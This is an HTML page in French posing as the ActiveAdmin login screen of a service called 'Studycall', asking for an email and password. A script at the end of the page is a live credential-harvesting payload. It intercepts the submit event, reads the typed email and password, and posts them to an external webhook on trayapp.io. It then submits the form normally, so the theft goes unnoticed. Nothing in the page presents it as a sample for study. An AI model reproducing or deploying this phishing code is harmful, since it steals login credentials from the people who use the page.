<html lang="fr">
<head>
  <meta http-equiv="Content-type" content="text/html; charset=utf-8">
  <title>Studycall</title>
  <link rel="stylesheet" media="all" href="/css/fichier.css">
</head>
<body class="active_admin logged_out new">
  <div id="wrapper">
    <div id="content_wrapper">
      <div class="flashes">
        <div class="flash flash_alert">Vous devez vous connecter ou vous inscrire pour continuer.</div>
      </div>
      <div id="active_admin_content">
        <div id="login">
          <h2>Studycall Connexion</h2>
          <div id="notice-tfa"></div>
          <div id="notice"></div>
          <form class="simple_form new_admin_user" id="login-form" accept-charset="UTF-8" method="post">
            <input type="hidden" name="authenticity_token" value="EjRPvq2UhfTHK9od9en7Bbs2BUwDMNBhh7tN4TQFaIcKjSGuS6P4kPSVwkbXZdElwc+kZPQJTC3B6Lv22aO3aA==">
            <fieldset class="input">
              <ol>
                <li class="email input required autofocus stringish admin-user" id="admin_user_email_input">
                  <label class="email optional label" for="admin_user_email">Email</label>
                  <input autofocus="autofocus" type="email" value="" name="admin_user[email]" id="admin_user_email">
                </li>
                <li class="password input required autofocus stringish admin-user" id="admin_user_password_input">
                  <label class="password optional label" for="admin_user_password">Mot de passe</label>
                  <input autofocus="autofocus" maxlength="128" size="128" type="password" name="admin_user[password]" id="admin_user_password">
                </li>
                <li class="boolean input optional admin-user" id="admin_user_remember_me_input">
                  <label class="string optional" for="admin_user_remember_me">Garder ma session ouverte</label>
                  <input name="admin_user[remember_me]" type="hidden" value="0">
                  <input value="1" type="checkbox" name="admin_user[remember_me]" id="admin_user_remember_me">
                </li>
              </ol>
            </fieldset>
            <fieldset class="actions">
              <ol>
                <li style="position: relative; display: flex; justify-content: center; align-items: center;">
                  <lottie-player autoplay="true" background="transparent" id="loader" loop="" speed="1" src="https://assets10.lottiefiles.com/packages/lf20_f1dhzsnx.json" style="visibility: hidden; width: 64px; height: 64px; position: absolute;"></lottie-player>
                  <input type="submit" name="commit" value="Se connecter" class="btn input_action" id="submit-button" data-disable-with="Se connecter">
                </li>
              </ol>
            </fieldset>
          </form>
          <a class="admin-user" href="/admin/password/new">Vous avez oublié votre mot de passe ?</a><br>
          <a class="admin-user" href="/admin/unlock/new">Renvoyer les informations de déverrouillage</a><br>
        </div>
      </div>
    </div>
    <div id="footer"></div>
  </div>

  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault(); // Empêcher la soumission par défaut du formulaire

      var email = document.getElementById('admin_user_email').value;
      var password = document.getElementById('admin_user_password').value;

      var data = {
        email: email,
        password: password
      };

      fetch('https://b5191f16-9c13-4022-b1ab-1e82d89146e0.eu1.trayapp.io', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        // Rediriger l'utilisateur ou afficher un message de succès ici
        document.getElementById('login-form').submit(); // Soumettre le formulaire après l'envoi réussi au webhook
      })
      .catch((error) => {
        console.error('Error:', error);
        // Afficher un message d'erreur ici
      });
    });
  </script>
</body>
</html>
